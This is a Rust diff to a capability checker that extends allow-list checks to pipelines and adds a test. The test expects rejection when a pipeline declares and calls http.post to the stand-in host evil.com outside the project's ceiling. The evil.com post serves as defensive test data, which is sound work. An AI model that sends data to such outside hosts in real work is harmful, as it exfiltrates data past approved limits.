@@ -20,6 +20,7 @@ pub fn check_module_against_manifest(m: &Module, caps: &CapsCeiling) -> Vec<Chec
         match item {
             Item::Fn(f) => check_params(&f.params, caps, &mut out),
             Item::Saga(s) => check_params(&s.params, caps, &mut out),
+            Item::Pipeline(p) => check_params(&p.params, caps, &mut out),
             _ => {}
         }
     }
@@ -223,6 +224,30 @@ mod tests {
                 assert_eq!(op, "http.post");
                 assert_eq!(entry, "evil.com");
                 assert_eq!(family, "http.allow");
+            }
+            other => panic!("wrong kind: {other:?}"),
+        }
+    }
+
+    #[test]
+    fn pipeline_allow_list_outside_ceiling_rejected_with_71() {
+        // M46.T3 — a pipeline's cap entries are intersected with the
+        // lockset ceiling exactly like a fn's or saga's.
+        let toml = project_with_http(&["api.acme.com"]);
+        let aer = r#"
+            pipeline Deploy(cap: cap[http.post @ ["evil.com"]]) {
+                intent "deploy"
+                steps:
+                    | http.post("https://evil.com/x", "body")
+            }
+        "#;
+        let es = errs(&toml, aer);
+        assert_eq!(es.len(), 1, "expected exactly one error, got {es:#?}");
+        assert_eq!(es[0].exit_code(), 71);
+        match &es[0].kind {
+            CheckErrorKind::AllowListOutsideLockset { op, entry, .. } => {
+                assert_eq!(op, "http.post");
+                assert_eq!(entry, "evil.com");
             }
             other => panic!("wrong kind: {other:?}"),
         }
